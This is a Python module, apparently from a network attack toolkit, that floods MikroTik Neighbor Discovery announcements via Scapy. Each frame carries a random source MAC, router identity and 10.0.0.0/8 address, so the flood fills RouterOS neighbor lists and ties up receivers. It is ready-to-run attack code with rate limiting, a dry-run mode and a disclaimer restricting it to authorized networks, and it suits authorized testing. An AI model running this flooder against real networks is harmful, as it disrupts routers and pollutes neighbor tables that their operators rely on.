"""MNDP flooding: send a high rate of MikroTik Neighbor Discovery announcements.

Each RouterOS device that receives an MNDP announcement adds or refreshes an entry in its
neighbor list. A flood of announcements from invented routers, each with its own MAC,
identity and address, fills that list and keeps the receiver busy parsing them.

Every frame here comes from a random unicast source MAC, claims a random identity and
IPv4 address, and uses a sequence number, so each one can create a new neighbor entry.
The effect to measure is the neighbor list and the rate it keeps up with.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import random
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import IP, UDP, Ether, Raw, sendp

from macabre.attacks.common import BROADCAST_MAC, random_mac
from macabre.attacks.mndp_spoofing import BROADCAST_IP, MNDP_PORT, mndp_payload

MAX_RATE = 5000.0          # frames per second; higher rates are refused
BATCH_SECONDS = 0.1        # frames are sent in batches this long


@dataclass(frozen=True)
class MndpFloodingConfig:
    iface: str                  # attacker interface, on the segment with the receivers
    rate: float = 100.0         # announcements per second
    count: int = 0              # announcements to send in total; 0 = run until stopped
    dry_run: bool = False       # build announcements but do not send them

    def __post_init__(self) -> None:
        if not 0 < self.rate <= MAX_RATE:
            raise ValueError(f"Rate must be between 0 and {MAX_RATE:g} announcements per second.")
        if self.count < 0:
            raise ValueError("Count cannot be negative.")


@dataclass
class MndpFloodingStats:
    frames: int = 0
    status: str = ""


def flood_frames(rng: random.Random, how_many: int, first_sequence: int = 1) -> list:
    """Announcements from random source MACs, each for a random router, identity and address."""
    frames = []
    for n in range(how_many):
        source = random_mac(rng)
        address = str(ipaddress.IPv4Address(0x0A000000 | rng.getrandbits(24)))  # 10.0.0.0/8
        payload = mndp_payload(
            source,
            f"RTR-{rng.getrandbits(32):08x}",
            "7.16",
            "MikroTik",
            "RB750Gr3",
            "MACABR",
            "ether1",
            uptime=rng.getrandbits(20),
            address=address,
            sequence=first_sequence + n,
        )
        frames.append(
            Ether(src=source, dst=BROADCAST_MAC)
            / IP(src=address, dst=BROADCAST_IP)
            / UDP(sport=MNDP_PORT, dport=MNDP_PORT)
            / Raw(payload)
        )
    return frames


def run_mndp_flooding(
    config: MndpFloodingConfig,
    stop_event: threading.Event,
    on_progress: Callable[[MndpFloodingStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
) -> MndpFloodingStats:
    """Send announcements at `rate` per second until `count` or `stop_event`."""
    rng = rng or random.Random()
    send = send or sendp

    if config.dry_run:
        stats = MndpFloodingStats(
            status=(
                f"Dry run: would send about {config.rate:g} MNDP announcements per second for random "
                f"routers. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    per_batch = max(1, round(config.rate * BATCH_SECONDS))
    stats = MndpFloodingStats()
    while not stop_event.is_set() and (config.count == 0 or stats.frames < config.count):
        batch = per_batch
        if config.count:
            batch = min(batch, config.count - stats.frames)
        send(flood_frames(rng, batch, first_sequence=stats.frames + 1), iface=config.iface, verbose=False)
        stats.frames += batch
        on_progress(replace(stats))
        stop_event.wait(BATCH_SECONDS)
    return stats
